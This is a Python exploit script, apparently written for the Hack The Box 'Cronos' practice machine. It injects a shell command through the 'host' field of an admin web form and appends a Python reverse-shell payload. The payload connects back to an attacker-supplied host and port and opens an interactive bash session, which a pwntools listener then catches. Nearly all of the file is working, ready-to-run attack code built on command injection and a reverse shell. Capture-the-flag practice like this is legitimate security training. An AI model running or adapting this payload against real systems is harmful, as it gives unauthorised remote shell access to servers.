# -*- coding:utf-8 -*-

# Cronos HTB - Command Injection
# CVE: -
# Exploit author: Renan Almeida
# Python script exploit author: Renan Almeida a.k.a. nullarmor <nullarmor@protonmail.com>

import argparse
import requests
import sys
from pwn import *


def main():
    # args
    argparser = argparse.ArgumentParser(description="Cronos HTB - Command Injection", 
                                        add_help=False)
    main_arg = argparser.add_argument_group("MAIN")
    
    main_arg.add_argument('-h', '--help', 
                            help='Show this help menu', 
                            action='store_true')
                            
    main_arg.add_argument('--lhost', type=str,
                            help='Local host to receive reverse shell', 
                            required=True)
    
    main_arg.add_argument('--lport', type=str,
                            help='Local port to receive reverse shell (default: 4444)', 
                            default='4444')
    
    main_arg.add_argument('--burpsuite', action='store_true',
                            help='Enable burpsuite proxy')
                            
    args = argparser.parse_args()
    
    # arg validation
    if args.help:
        argparser.print_help()
        sys.exit(1)
        
    # cons
    lhost = args.lhost
    lport = args.lport
    burpsuite = args.burpsuite
    
    # proxies
    proxies = { "http": "127.0.0.1:8080" }
   
    def reverse_shell(l):
        l.sendline("id && uname -a")
        l.interactive()
    
  
    def exploit():
        py_payload = "python -c 'import socket,subprocess,os;"
        py_payload += "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        py_payload += "s.connect((\"{}\",{}));".format(lhost, lport)
        py_payload += "os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
        py_payload += "p=subprocess.call([\"/bin/bash\",\"-i\"]);'"
        
        params = {
            "host": "8.8.8.8;sleep 10;" + py_payload,
            "submit": "Execute!"
        }
        
        l = listen(lport)    
        l1 = log.progress("Cronos exploit")
        
        try:
            if burpsuite:
                r = requests.post("http://admin.cronos.htb/welcome.php", data=params,
                                                                    proxies=proxies, 
                                                                    timeout=5)
            else:
                r = requests.post("http://admin.cronos.htb/welcome.php", data=params, 
                                                                    timeout=5)    
        except:
            l1.success("Triggered!")
            reverse_shell(l)
        
        else:
            print(r.content)
        
        
        
    # main
    log.info("Cronos HTB - Command Injection")
    log.info("Python script exploit author: nullarmor")
    
    exploit()
    

if __name__ == '__main__':
    main()
